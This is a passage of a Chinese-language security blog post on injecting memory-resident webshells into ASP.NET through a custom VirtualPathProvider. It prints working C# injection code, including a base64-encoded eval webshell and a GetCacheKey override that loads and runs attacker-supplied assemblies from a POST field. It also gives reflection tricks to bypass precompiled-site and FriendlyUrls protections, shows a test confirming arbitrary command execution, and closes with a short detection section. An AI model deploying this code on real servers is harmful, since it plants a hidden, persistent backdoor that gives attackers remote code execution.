+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">internal</span> <span class="k">static</span> <span class="k">void</span> <span class="n">RegisterVirtualPathProviderInternal</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider1</span> <span class="p">=</span> <span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span><span class="p">.</span><span class="n">_virtualPathProvider</span><span class="p">;</span><span class="c1">//获取原来的VPP对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span><span class="p">.</span><span class="n">_virtualPathProvider</span> <span class="p">=</span> <span class="n">virtualPathProvider</span><span class="p">;</span><span class="c1">//把指针指向新注册的VPP对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">virtualPathProvider</span><span class="p">.</span><span class="n">Initialize</span><span class="p">(</span><span class="n">virtualPathProvider1</span><span class="p">);</span><span class="c1">//调用新注册VPP的Initialize</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">internal</span> <span class="k">virtual</span> <span class="k">void</span> <span class="n">Initialize</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">previous</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_previous</span> <span class="p">=</span> <span class="n">previous</span><span class="p">;</span><span class="c1">//把原有的vpp设置为当前vpp的上一个节点</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">Initialize</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在这里，我们可以看到整个VirtualPathProvider生效使用了单项链表的结构，每注册一个VPP都会把当前指针指到新注册的VPP对象，然后把原有的VPP设为当前VPP的上一个节点。然后在新的Web请求到来时，Web Server会从最新的节点开始，逐个遍历链表上的所有节点，直到previous为null。</p>
+<p>还有一个点需要注意，由于VirtualPathProvider继承了MarshalByRefObject，MarshalByRefObject有一个InitializeLifetimeService方法，作用是获取生存期服务对象来控制此实例的生存期策略。所以为了保持我们的内存马一直保持存活状态，我们可以调用VirtualPathProvider.InitializeLifetimeService方法来将其置空，从而防止创建限制对象生存期<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8" target="_blank" rel="noopener noreferrer">VirtualPathProvider</a>的租约。</p>
+<p>综上所述，我们的注入部分代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"> <span class="kt">string</span> <span class="n">webshellContentsBase64</span> <span class="p">=</span> <span class="s">&#34;SSBhbSBhIFdlYlNoZWxsPCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JWV2YWwoUmVxdWVzdC5JdGVtWyJhbnQiXSwidW5zYWZlIik7JT4=&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">webshellType</span> <span class="p">=</span> <span class="s">&#34;.aspx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">webshellContent</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">webshellContentsBase64</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">targetVirtualPath</span> <span class="p">=</span> <span class="s">&#34;/yzddmr6.aspx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SamplePathProvider</span> <span class="n">sampleProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SamplePathProvider</span><span class="p">(</span><span class="n">targetVirtualPath</span><span class="p">,</span> <span class="n">webshellContent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">RegisterVirtualPathProvider</span><span class="p">(</span><span class="n">sampleProvider</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sampleProvider</span><span class="p">.</span><span class="n">InitializeLifetimeService</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">error</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="测试" class="headerLink">
+    <a href="#%e6%b5%8b%e8%af%95" class="header-mark"></a>2.3 测试</h3><p>注入之前，访问/yzddmr6.aspx返回404错误</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437308075-0685d39c-542f-4e75-a0e3-f350662386f7.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437308075-0685d39c-542f-4e75-a0e3-f350662386f7.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437308075-0685d39c-542f-4e75-a0e3-f350662386f7.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437308075-0685d39c-542f-4e75-a0e3-f350662386f7.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437308075-0685d39c-542f-4e75-a0e3-f350662386f7.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437308075-0685d39c-542f-4e75-a0e3-f350662386f7.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>注入内存马，一片空白表示注入成功</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437325381-63996f7b-9108-4bea-b5b5-a56d4839ce9b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437325381-63996f7b-9108-4bea-b5b5-a56d4839ce9b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437325381-63996f7b-9108-4bea-b5b5-a56d4839ce9b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437325381-63996f7b-9108-4bea-b5b5-a56d4839ce9b.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437325381-63996f7b-9108-4bea-b5b5-a56d4839ce9b.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437325381-63996f7b-9108-4bea-b5b5-a56d4839ce9b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>再次访问/yzddmr6.aspx，内存马成功植入，我们已经可以执行任意命令了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437482899-ab351741-1899-4e40-89eb-2ac3b20b7c85.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437482899-ab351741-1899-4e40-89eb-2ac3b20b7c85.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437482899-ab351741-1899-4e40-89eb-2ac3b20b7c85.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437482899-ab351741-1899-4e40-89eb-2ac3b20b7c85.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437482899-ab351741-1899-4e40-89eb-2ac3b20b7c85.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647437482899-ab351741-1899-4e40-89eb-2ac3b20b7c85.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="进阶思考" class="headerLink">
+    <a href="#%e8%bf%9b%e9%98%b6%e6%80%9d%e8%80%83" class="header-mark"></a>3 进阶思考</h2><p>以上是参考官方文档后的标准写法，是否存在优化的空间呢？</p>
+<h3 id="注入代码的位置" class="headerLink">
+    <a href="#%e6%b3%a8%e5%85%a5%e4%bb%a3%e7%a0%81%e7%9a%84%e4%bd%8d%e7%bd%ae" class="header-mark"></a>3.1 注入代码的位置</h3><p>在之前内存马文章中我提到过https://tttang.com/archive/1420/，我们只要在任意一个可以被每次请求触发的位置加入我们的逻辑即可做到内存马的效果。所以我们并不是一定非要按照官方文档实现一个VirtualFile对象，触发路径什么的其实对于我们来说也并不是必选项。</p>
+<p>因为每次请求都需要去判断文件是否存在，所以理所应当就想到了把内存马注入到FileExists方法中。后来看了下哥斯拉的内存马是插在GetCacheKey方法里。我们当然希望我们的内存马是作为最高优先级被访问。这里我给两个函数都下个断点，看哪个先被命中，就知道哪个优先级比较高了。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525064788-fc41cee5-10a2-4541-8584-714032335f76.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525064788-fc41cee5-10a2-4541-8584-714032335f76.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525064788-fc41cee5-10a2-4541-8584-714032335f76.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525064788-fc41cee5-10a2-4541-8584-714032335f76.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525064788-fc41cee5-10a2-4541-8584-714032335f76.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525064788-fc41cee5-10a2-4541-8584-714032335f76.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>看起来iis会先调用System.Web.Compilation.BuildManager.GetCacheKeyFromVirtualPath来获取当前的CacheKey，然后才会去触发FileExists方法。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647524991715-af5a3e4c-6ca3-472b-aebd-424bc13c149d.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647524991715-af5a3e4c-6ca3-472b-aebd-424bc13c149d.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647524991715-af5a3e4c-6ca3-472b-aebd-424bc13c149d.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647524991715-af5a3e4c-6ca3-472b-aebd-424bc13c149d.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647524991715-af5a3e4c-6ca3-472b-aebd-424bc13c149d.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647524991715-af5a3e4c-6ca3-472b-aebd-424bc13c149d.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>经过进一步优化之后，我们仅重写了GetCacheKey一个方法，就实现内存马了的效果。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">SamplePathProvider</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualPathProvider</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="kt">string</span> <span class="n">GetCacheKey</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">HttpContext</span> <span class="n">context</span> <span class="p">=</span> <span class="n">HttpContext</span><span class="p">.</span><span class="n">Current</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">Payload</span> <span class="p">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">Payload</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span> <span class="p">+</span> <span class="s">&#34;.Run&#34;</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">.</span><span class="n">End</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Previous</span><span class="p">.</span><span class="n">GetCacheKey</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕过预编译" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87%e9%a2%84%e7%bc%96%e8%af%91" class="header-mark"></a>3.2 绕过预编译</h3><p>在官方文档有一句话：</p>
+<p>If a Web site is precompiled for deployment, content provided by a VirtualPathProvider instance is not compiled, and no VirtualPathProvider instances are used by the precompiled site.</p>
+<p>并且在之前HostingEnvironment.RegisterVirtualPathProvider会判断当前BuildManager.IsPrecompiledApp是否为true。所以当目标网站是预编译发布的模式，我们需要利用反射来绕过预编译。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_isPrecompiledAppComputed</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_isPrecompiledApp</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_theBuildManager_instance</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_isPrecompiledAppComputed_oldValue</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">object</span> <span class="n">field_isPrecompiledApp_oldValue</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">typeBuildManager</span> <span class="p">=</span> <span class="k">typeof</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Compilation</span><span class="p">.</span><span class="n">BuildManager</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">FieldInfo</span> <span class="n">field_theBuildManager</span> <span class="p">=</span> <span class="n">typeBuildManager</span><span class="p">.</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_theBuildManager&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                                                              <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">field_isPrecompiledAppComputed</span> <span class="p">=</span> <span class="n">typeBuildManager</span><span class="p">.</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_isPrecompiledAppComputed&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                                           <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">field_isPrecompiledApp</span> <span class="p">=</span> <span class="n">typeBuildManager</span><span class="p">.</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_isPrecompiledApp&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                                   <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">field_theBuildManager_instance</span> <span class="p">=</span> <span class="n">field_theBuildManager</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="k">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">field_isPrecompiledApp_oldValue</span> <span class="p">=</span> <span class="n">field_isPrecompiledApp</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="kt">bool</span><span class="p">)</span> <span class="n">field_isPrecompiledApp_oldValue</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// To disable isPrecompiledApp settings</span>
+</span></span><span class="line"><span class="cl">    <span class="n">field_isPrecompiledAppComputed</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">field_isPrecompiledApp</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">field_theBuildManager_instance</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕过friendlyurl" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87friendlyurl" class="header-mark"></a>3.3 绕过FriendlyUrl</h3><p>asp.net有个功能叫做FriendlyUrls，可以省略后缀.aspx，主要可能用于seo优化</p>
+<p>可以通过RouteTable.Routes.EnableFriendlyUrls()开启。</p>
+<p>yso.net中给出了绕过的payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"> <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">route</span> <span class="k">in</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Routing</span><span class="p">.</span><span class="n">RouteTable</span><span class="p">.</span><span class="n">Routes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">route</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">FullName</span> <span class="p">==</span> <span class="s">&#34;Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="kt">var</span> <span class="n">FriendlySetting</span> <span class="p">=</span> <span class="n">route</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetProperty</span><span class="p">(</span><span class="s">&#34;Settings&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="kt">var</span> <span class="n">settings</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">AspNet</span><span class="p">.</span><span class="n">FriendlyUrls</span><span class="p">.</span><span class="n">FriendlyUrlSettings</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">settings</span><span class="p">.</span><span class="n">AutoRedirectMode</span> <span class="p">=</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">AspNet</span><span class="p">.</span><span class="n">FriendlyUrls</span><span class="p">.</span><span class="n">RedirectMode</span><span class="p">.</span><span class="n">Off</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">FriendlySetting</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">route</span><span class="p">,</span> <span class="n">settings</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="测试-1" class="headerLink">
+    <a href="#%e6%b5%8b%e8%af%95-1" class="header-mark"></a>3.4 测试</h3><p>注入我们的内存马之后，访问任意一个原本存在的aspx页面，使用蚁剑即可连接。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525561068-04f8ff9a-ad85-4f48-9f2e-8235c8184158.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525561068-04f8ff9a-ad85-4f48-9f2e-8235c8184158.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525561068-04f8ff9a-ad85-4f48-9f2e-8235c8184158.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525561068-04f8ff9a-ad85-4f48-9f2e-8235c8184158.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525561068-04f8ff9a-ad85-4f48-9f2e-8235c8184158.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647525561068-04f8ff9a-ad85-4f48-9f2e-8235c8184158.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="检测内存马" class="headerLink">
+    <a href="#%e6%a3%80%e6%b5%8b%e5%86%85%e5%ad%98%e9%a9%ac" class="header-mark"></a>4 检测内存马</h2><p>本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。</p>
+<p>下载项目中的检测脚本 <a href="https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx" target="_blank" rel="noopener noreferrer">https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx</a>，放到网站目录下，浏览器访问。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526742526-e8898a6e-20bf-45cc-9db7-047fc0786c61.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526742526-e8898a6e-20bf-45cc-9db7-047fc0786c61.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526742526-e8898a6e-20bf-45cc-9db7-047fc0786c61.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526742526-e8898a6e-20bf-45cc-9db7-047fc0786c61.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526742526-e8898a6e-20bf-45cc-9db7-047fc0786c61.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526742526-e8898a6e-20bf-45cc-9db7-047fc0786c61.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>其中id为1的是本文后一种注入方法，id为2的是前一种注入方法。前一种注入方法可以通过类成员来获取注入的路径跟实现的内容。</p>
+<p>可以根据CodeBase的地址获得dll，用dnspy打开，找到类名对应的文件，发现恶意代码，即可确认被注入了内存马。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526857545-608a5f59-9f81-4399-bbda-818eea348bc5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526857545-608a5f59-9f81-4399-bbda-818eea348bc5.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526857545-608a5f59-9f81-4399-bbda-818eea348bc5.png"
